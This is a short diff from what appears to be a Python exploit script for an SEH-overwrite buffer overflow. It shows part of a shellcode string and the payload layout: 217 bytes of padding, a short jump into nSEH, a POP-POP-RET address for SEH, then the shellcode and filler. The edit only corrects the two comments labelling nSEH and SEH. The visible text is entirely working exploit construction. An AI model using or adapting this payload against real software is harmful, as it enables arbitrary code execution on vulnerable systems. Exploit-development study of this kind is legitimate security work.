@@ -42,8 +42,8 @@ shellcode += "\x16\x33\x0b\x1b\x56\xb2\x90\x98\x89\x0e\x6d\x04"
 shellcode += "\xf6\x8b\x2d\xa3\x90\xfc\xf9\x8e\x83\xdd\x69\x31"
 
 payload = "A" * 217
-payload += "\xEB\x06\x90\x90" # JMP SHORT 0x0c -> seh 
-payload += p32(0x10018aff)    # POP2RET -> nseh
+payload += "\xEB\x06\x90\x90" # JMP SHORT 0x0c -> nseh 
+payload += p32(0x10018aff)    # POP2RET -> seh
 payload += shellcode
 payload += "B" * 200
 
